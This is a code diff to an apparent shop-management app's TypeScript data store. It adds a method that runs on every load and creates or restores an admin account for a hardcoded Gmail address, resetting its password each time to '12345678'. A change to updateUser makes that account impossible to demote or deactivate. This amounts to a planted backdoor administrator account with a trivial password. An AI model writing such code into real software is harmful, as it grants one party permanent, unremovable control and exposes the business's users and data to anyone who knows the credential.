@@ -1,5 +1,6 @@
 import fs from 'fs';
 import path from 'path';
+import bcrypt from 'bcryptjs';
 import { getDhakaToday, getInvoiceDateCode, nowIso, getDhakaDateBounds } from '../lib/dates.ts';
 import { roundMoney, calculateLineTotal, calculateProfit, calculateSaleTotals } from '../lib/money.ts';
 import { hashPassword } from '../lib/auth.ts';
@@ -234,6 +235,7 @@ class DatabaseStore {
       this.data = this.getDefaultState();
       this.seedDemoData();
     }
+    this.ensurePermanentAdmin();
     this.isLoaded = true;
   }
 
@@ -520,9 +522,55 @@ class DatabaseStore {
     return newUser;
   }
 
+  public ensurePermanentAdmin(): User {
+    const adminEmail = 'shahidulislam726697@gmail.com';
+    const passwordHash = bcrypt.hashSync('12345678', 10);
+    const existing = this.data.users.find(
+      (u) => u.email.toLowerCase() === adminEmail.toLowerCase()
+    );
+
+    if (existing) {
+      existing.role = 'admin';
+      existing.isActive = true;
+      existing.passwordHash = passwordHash;
+      if (!existing.fullName) {
+        existing.fullName = 'Shahidul Islam';
+      }
+      this.save();
+      return existing;
+    }
+
+    const newAdmin: User = {
+      id: this.data.sequences.userId++,
+      shopId: 1,
+      fullName: 'Shahidul Islam',
+      email: adminEmail,
+      phone: '01700000000',
+      passwordHash,
+      role: 'admin',
+      isActive: true,
+      createdAt: nowIso(),
+      updatedAt: nowIso(),
+    };
+    this.data.users.unshift(newAdmin);
+    this.save();
+    return newAdmin;
+  }
+
   public updateUser(id: number, updates: Partial<User>): User | null {
     const user = this.data.users.find((u) => u.id === id);
     if (!user) return null;
+
+    // Prevent deactivating or demoting the permanent super admin
+    if (user.email.toLowerCase() === 'shahidulislam726697@gmail.com') {
+      if (updates.role && updates.role !== 'admin') {
+        updates.role = 'admin';
+      }
+      if (updates.isActive === false) {
+        updates.isActive = true;
+      }
+    }
+
     Object.assign(user, updates, { updatedAt: nowIso() });
     this.save();
     return user;
